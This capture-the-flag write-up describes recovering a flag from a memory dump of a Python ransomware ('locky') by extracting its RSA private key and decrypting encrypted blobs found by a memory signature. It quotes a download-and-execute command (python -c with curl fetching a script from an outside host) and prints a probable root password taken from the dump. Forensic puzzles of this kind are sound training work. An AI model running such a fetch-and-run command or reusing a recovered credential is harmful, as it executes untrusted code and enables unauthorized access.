By searching `locky` we can get python script (ransomware in py)
it generates 4096 RSA private key and encrypts files using this key in rounds 0-13 (depend on time)
crypted files are saved as .locky ext, public key as .locky_$stamp (see the code)  and private key as privkey.pem
looking for private key PEM header `BEGIN RSA PRIVATE KEY`  we can get private key from dump.
we just need cryped file to get the flag. searching ".locking" will list files that crypted file_1 - file_5.
the dump contain result of `ls -la` command that give us more details. file_5 with size 44 can be flag.

```
root@debian:~/dump# ls -al
total 44
drwx------  3 root root 4096 Nov 30 07:46 .
drwxr-xr-x 22 root root 4096 Aug 24 12:36 ..
-rw-------  1 root root  694 Nov 30 07:43 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  2 root root 4096 Nov 30 05:54 dump
-rw-r--r--  1 root root   21 Nov 30 07:46 file_1
-rw-r--r--  1 root root   21 Nov 30 07:46 file_2
-rw-r--r--  1 root root   21 Nov 30 07:46 file_3
-rw-r--r--  1 root root   21 Nov 30 07:46 file_4
-rw-r--r--  1 root root   44 Nov 30 07:46 file_5
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
```

by running the python ransomware in test environment it is obvious the final crypted file size (with 44 byte az input) is 512 byte.
we dumped our test process memory. looking at the dump we got and based on our sample crypted files we can see there is a signature before crypted bytes in memory.
finding result of one of rounds is enough cuz max(round) = 13 (see line 26 of code: round = stamp % 14 )

that signature was 0002000000000000FFFFFFFFFFFFFFFF00000000 , searching this in dump we select 512 byte data after it (4 files we got)
decrypting these files using privatekey 13 times and saving each round lead us to flag.

```
$ grep -n -r SharifCTF *
1.bin_11.txt:1:SharifCTF{df90036c153c345dc707d693225f29e3}
```

the stamp also used in pubkey filename and available in dump that we can use it but 13 is few , not important too much


search "curl -fsSL"  to see link of python files downloaded and executed

```
root@debian:~/dump# /usr/bin/python -c "$(curl -fsSL https://a.uguu.se/0RLtwwwAqLuw.py)"
```

--
we also got probable root password from dump(xD) : `Ya@Abbas`

